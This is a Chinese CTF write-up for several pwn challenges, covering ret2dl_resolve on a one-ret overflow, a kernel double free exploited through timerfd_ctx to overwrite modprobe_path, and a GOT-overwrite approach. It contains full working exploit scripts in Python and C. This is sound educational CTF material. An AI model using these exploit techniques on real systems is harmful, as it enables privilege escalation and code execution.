# Reading_test
```sh
[*] '/ctf/work/chall/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'./'
```

本题目只有一个ret的溢出,
+ no pie
+ partial relro
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 buf; // [rsp+8h] [rbp-8h] BYREF

  buf = 24LL;
  read(0, &buf, 0x18uLL);
  return 0;
}
```
最开始自己写的时候是可以达成任意地址写,但是不知道下面的步骤,赛后知道原来是64位的`ret2dl_resolve`

首先可以看到64位程序的开头LOAD段里面有几个table, 分别是`Hash Table, String Table, Symbol Version Table, RELA Relocation Table, JUMPREL Relocation Table`

需要了解的结构体如下
```c
/* elf/link.h */
struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */

    ElfW(Addr) l_addr;		/* Difference between the address in the ELF
				   file and the addresses in memory.  */
    char *l_name;		/* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;		/* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
    ....
  };
```

```c
typedef struct
{
  Elf64_Word	st_name;		/* Symbol name (string tbl index) */
  unsigned char	st_info;		/* Symbol type and binding */
  unsigned char st_other;		/* Symbol visibility */
  Elf64_Section	st_shndx;		/* Section index */
  Elf64_Addr	st_value;		/* Symbol value */
  Elf64_Xword	st_size;		/* Symbol size */
} Elf64_Sym;


typedef struct
{
  Elf64_Addr	r_offset;		/* Address */
  Elf64_Xword	r_info;			/* Relocation type and symbol index */
  Elf64_Sxword	r_addend;		/* Addend */
} Elf64_Rela;


typedef struct
{
  Elf64_Sxword	d_tag;			/* Dynamic entry type */
  union
    {
      Elf64_Xword d_val;		/* Integer value */
      Elf64_Addr d_ptr;			/* Address value */
    } d_un;
} Elf64_Dyn;
```

## dl_runtime_resolve
这里他实际上最后调用的是`_dl_fixup`函数, 参数为`struct link_map *l`和`reloc_arg`

接下来的步骤就是先从`link_map`里面获取到`symtab`, `strtab`,`pltgot`
```c
...
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);

  const uintptr_t pltgot = (uintptr_t) D_PTR (l, l_info[DT_PLTGOT]);

  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL])
		      + reloc_offset (pltgot, reloc_arg));
...
```
获取plt表中的表项下标,也就是我们plt表中push的数字,然后通过这个数字找到`JMPREL TABLE`的对应位置,将这个位置记录下来为reloc

而这个reloc的数据结构形式是`Elf64_rela`,如下
```c
typedef struct
{
  Elf64_Addr	r_offset;		/* Address */
  Elf64_Xword	r_info;			/* Relocation type and symbol index */
  Elf64_Sxword	r_addend;		/* Addend */
} Elf64_Rela;
```
其中`reloc->r_info`里面的是解析函数位于符号表`symtab`的下标,
```c
..
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  const ElfW(Sym) *refsym = sym;
..
```
而这样就可以取出他的`symtab`的表项
然后获取重定位段的地址
```c
...
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
...
```
而这里我们可以自己构造这几个表的**表项**,而且这里需要我们填写其中的偏移部分即可

这里介绍一个`pwntools`工具,介绍一下使用方法

```python
# 解析elf文件, 然后传入的symbol代表我想要本次解析的内容, args表示希望传递的参数
dlresolve = Ret2dlresolvePayload(exe, symbol="write", args=["cat flag.txt"])
...
# 这里表示其寻找到的适合填入ret2dlresolve所构造的一系列元素地址,同时也是即将写入查询符号的地址
dlresolve.data_addr
# 表示在调用_dl_fixup中传递的第二个参数,同时也是JMPREL TABLE的表项index
dlresolve.reloc_index
# 这里就是所伪造的一系列内容
dlresolve.payload
# 这里是传递的第一个参数
dlresolve.real_args[0]
```

然后本题有一个考点那就是本题你无法控制rdi,这就导致在即使你写入了write的libc地址仍然只能达成`write(0, buf, size)`
但在打远程的时候,stdin并不是我们理解的终端屏幕,而是socat, 所以这样的write仍是可以进行回显
但在打本地希望通过时需要`io=process("./pwn", stdin = PTY)`才可通过

所以本题的解法就是使用ret2dl_resolve写入write的地址然后写泄漏libc

exp如下: 
```python

#!/usr/bin/env python3

from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
context.terminal = "kitty @launch --location=split --cwd=current".split()


def start(argv=[], *a, **kw):
    if args.LOCAL:
        argv = argv if argv else [exe.path]
        if args.GDB:
            return gdb.debug(argv, gdbscript=gdbscript, *a, **kw)
        return process(argv, stdin=PTY, *a, **kw)
    return remote(args.HOST or host, args.PORT or port, *a, **kw)


def safe_flat(*args, unsafe_chars=b"\n", **kwargs):
    p = flat(args, **kwargs)
    if any(c in unsafe_chars for c in p):
        raise ValueError("unsafe:", p)
    return p


gdbscript = """
b main
c
"""
host, port = args.HOST or "localhost", args.PORT or 55550
exe = context.binary = ELF(args.EXE or "./chall", False)
libc = ELF("./libc.so.6", False)

#io = start()
io = process("./chall")
write_rbp = exe.sym["main"] + 23
write_rbp_with_rdx = exe.sym["main"] + 16
pop_rbp = 0x40110D
leave_ret = 0x401153

dlresolve = Ret2dlresolvePayload(exe, symbol="write", args=["cat flag.txt"])
#print(hex(dlresolve))
log.info(f"{hex(dlresolve.data_addr) = }")
# 获取plt首地址
plt_init = exe.get_section_by_name(".plt").header.sh_addr
print(hex(plt_init))


io.send(safe_flat(0, exe.bss(0xF50 + 8), write_rbp))
pause()
io.send(safe_flat(0x1000, exe.bss(0xF50 + 8), write_rbp_with_rdx))
pause()

# Why not do it all at once? Because Indonesia's internet is so slow,
# I can't even send 2000 bytes at once.
rop1 = safe_flat(0, 0, pop_rbp, exe.sym["got.read"] + 8, write_rbp)

rop2 = safe_flat(
    # This will call dlresolve again for the read function.
    # Try to place it as close as possible to dlresolve.data_addr.
    # This is because _rtld_global_ro._dl_x86_cpu_features.xsave_state_size
    # can have different values on different CPUs.
    # See the _dl_runtime_resolve_xsavec function for more details.
    exe.sym["read"],
    plt_init,
    dlresolve.reloc_index,
    pop_rbp,
    exe.bss(0x900),
    write_rbp,
)
io.send(safe_flat(0, 0, pop_rbp, dlresolve.data_addr - len(rop1) - len(rop2) + 8, write_rbp))
pause()
io.send(rop1 + rop2 + dlresolve.payload)
pause()
io.send(safe_flat(exe.sym["read"] + 6, dlresolve.data_addr - len(rop2) - 8, leave_ret))
pause()
io.send(p8(libc.sym["read"] & 0xFF))
libc.address = u64(io.recv(8)) - libc.sym["read"]
log.info(f"{hex(libc.address) = }")

rop = ROP(libc)
rop.system(dlresolve.real_args[0])
rop.exit(0)

io.sendline(safe_flat(0, 0, rop.chain()))

io.interactive()
```

# K
这题真的逆天， 虽然说`/root/flag`的权限是`rwx---------`,但这个文件所有者就是普通用户，直接cat即可
题目一出70多解，后面出题人放了出来K的复仇
# K_Revenge
题目漏洞点存在一个任意大小的double free,这里我们可以使用结构体`timerfd_ctx`
这里可以实现从`kmalloc-256`池里面分配一个块来赋予`struct timerfd_ctx结构体`，然后向其中填入内容

```c
struct timerfd_ctx {
	union {
		struct hrtimer tmr;
		struct alarm alarm;
	} t;
	ktime_t tintv;
	ktime_t moffs;
	wait_queue_head_t wqh;
	u64 ticks;
	int clockid;
	short unsigned expired;
	short unsigned settime_flags;	/* to show in fdinfo */
	struct rcu_head rcu;
	struct list_head clist;
	spinlock_t cancel_lock;
	bool might_cancel;
};
```

其中结构体的`struct hrtimer tmr `这个字段类型的function字段指向的是一个内核函数，因此他可以泄漏内核代码段基地址,经过实际调试，在这个字段中同样也可以泄露内核堆的地址
其中利用方式如下：
```c
void timer_leak() {
    int timefd =  syscall(__NR_timerfd_create, CLOCK_REALTIME, 0);
    struct itimerspec itimerspec;

	itimerspec.it_interval.tv_sec = 0;
	itimerspec.it_interval.tv_nsec = 0;
	itimerspec.it_value.tv_sec = 100;
	itimerspec.it_value.tv_nsec = 0;

	timerfd_settime(timefd, 0, &itimerspec, 0);
	close(timefd);
	sleep(1);
}
```

本题最终的exp如下
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/timerfd.h>
#include <syscall.h>

#define ALLOC 0x1111
#define READ 0x2222
#define FREE 0x3333

size_t timerfd_func_addr=0xffffffff812fdb30;
size_t modeprobe_path_addr = 0xffffffff82b3f100;

#define HOME_PATH "/home/flag.sh"
char userful_shell[] = "#!/bin/sh\nchmod 777 /root/flag";


#define PRINT_ADDR(str, x) printf("\033[0m\033[1;34m[+]%s \033[0m:%p\n", str, x)

void info_log(char* str){
	 printf("\033[0m\033[1;32m[+]%s\033[0m\n",str);
}

void error_log(char* str){
  printf("\033[0m\033[1;31m%s\033[0m\n",str);
  exit(1);
}

int dev_fd;


struct u_param {
    size_t limit;
    void *user_ptr;
};

void timer_leak() {
    int timefd =  syscall(__NR_timerfd_create, CLOCK_REALTIME, 0);
    struct itimerspec itimerspec;

	itimerspec.it_interval.tv_sec = 0;
	itimerspec.it_interval.tv_nsec = 0;
	itimerspec.it_value.tv_sec = 100;
	itimerspec.it_value.tv_nsec = 0;

	timerfd_settime(timefd, 0, &itimerspec, 0);
	close(timefd);
	sleep(1);
}



int main()
{
    size_t kaslr_offset = 0;
    char payload[0x80] = {0}; 
    struct u_param param = {0};
    int pty_fd = 0;

    int fd = open(HOME_PATH, O_RDWR|O_CREAT);
    write(fd, userful_shell, sizeof(userful_shell));
    close(fd);
    system("chmod +x /home/flag.sh");
    system("echo -e '\\xff\\xff\\xff\\xff' > /home/fake");
    system("chmod +x /home/fake");

    dev_fd = open("/dev/K", O_RDWR);
    if(dev_fd < 0){
        perror("open");
        exit(1);
    }

    memset(payload, 'A', sizeof(payload));

    /* alloc 0x100 slab(kmalloc-256) and copy from uesr */
    param.limit = 0x100;
    param.user_ptr = payload;
    if(ioctl(dev_fd, ALLOC, &param)< 0){
        perror("ioctl");
        exit(1);
    }

    /* free 0x100 slab */
    param.limit = 0x100;
    param.user_ptr = 0;
    if(ioctl(dev_fd, FREE, &param)< 0){
        perror("ioctl");
        exit(1);
    }

    /* realloc timerfd_ctx (kmalloc-256) */
    timer_leak();


    // use heap slab(kmalloc-1k) and copy to uesr 
    param.limit = 0x100;
    param.user_ptr = payload;
    if(ioctl(dev_fd, READ, &param)< 0){
        perror("ioctl");
        exit(1);
    }

    /* get the kaslr */
    kaslr_offset = ((size_t *)payload)[5] - timerfd_func_addr;
    PRINT_ADDR("kaslr_offset", kaslr_offset);
    modeprobe_path_addr += kaslr_offset;
    PRINT_ADDR("modeprobe_path_addr", modeprobe_path_addr);

    param.limit = 0x80;
    param.user_ptr = payload;

    if(ioctl(dev_fd, ALLOC, &param)< 0){
        perror("ioctl");
        exit(1);
    }
    if(ioctl(dev_fd, FREE, &param)< 0){
        perror("ioctl");
        exit(1);
    }
    if(ioctl(dev_fd, FREE, &param)< 0){
        perror("ioctl");
        exit(1);
    }

    /* alloc 0x80 slab(kmalloc-1k) and copy from uesr */
    /* alloc to the modprobe_path */
    param.limit = 0x80;
    param.user_ptr = payload;
    *(size_t *)&payload[0x40] = modeprobe_path_addr - 0x10;
    if(ioctl(dev_fd, ALLOC, &param)< 0){
        perror("ioctl");
        exit(1);
    }

    *(size_t *)&payload[0x40] = modeprobe_path_addr - 0x10;
    if(ioctl(dev_fd, ALLOC, &param)< 0){
        perror("ioctl");
        exit(1);
    }

    memcpy(&payload[0x10], HOME_PATH, 0x10);

    /* has to be modprobe_path */
    if(ioctl(dev_fd, ALLOC, &param)< 0){
        perror("ioctl");
        exit(1);
    }
    system("/home/fake");


    return 0;
}
```

# Baby_cfhp
这一题开头送了一个任意地址写，且本身是`no pie`的
```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

int main(void){
	unsigned long *ptr;
	int idx, val;
	printf("address: ");
	scanf("%ld", &ptr);
	printf("value: ");
	scanf("%i", &val);
    /*(获取ptr指针内容的0xffffffffffff0000) | ptr指针内容低0xff异或var的低0xff再异或 */
	*ptr = (*ptr & ~((1<<16)-1)) | ((*ptr & 0xff) ^ ((val & 0xff) ^ ((val & 0xff) >> 1))) | (*ptr & 0xffff &~0xff);	
	exit(0);
}

__attribute__((constructor))
void init(void){
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);
}
```

思路大概是先修改exit_got为_start函数，然后修改setbuf_got为puts来泄露libc,最后修改exit_got为one_gadget





# 参考
[https://blog.imv1.me/2021/04/15/ret2dl_resolve/](https://blog.imv1.me/2021/04/15/ret2dl_resolve/)
